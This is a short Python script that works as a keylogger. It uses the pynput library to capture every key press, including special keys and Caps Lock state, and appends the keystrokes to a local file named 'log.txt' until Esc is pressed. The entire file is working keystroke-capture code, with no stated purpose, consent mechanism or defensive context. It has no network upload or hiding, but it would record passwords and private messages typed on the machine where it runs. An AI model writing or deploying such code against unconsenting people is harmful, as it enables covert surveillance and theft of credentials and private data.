from pynput import keyboard

log_file = "log.txt"
caps_lock_on = False

def on_press(key):
    global caps_lock_on
    char = ""

    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
            if caps_lock_on:
                char = char.upper()
            else:
                char = char.lower()
        else:
            if key == keyboard.Key.space:
                char = ' '
            elif key == keyboard.Key.enter:
                char = '\n'
            elif key == keyboard.Key.backspace:
                char = "[backspace]"
            elif key == keyboard.Key.caps_lock:
                caps_lock_on = not caps_lock_on
                return  # Do not log Caps Lock key press
            else:
                char = f"[{key.name}]"
        
        with open(log_file, "a") as f:
            f.write(char)
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
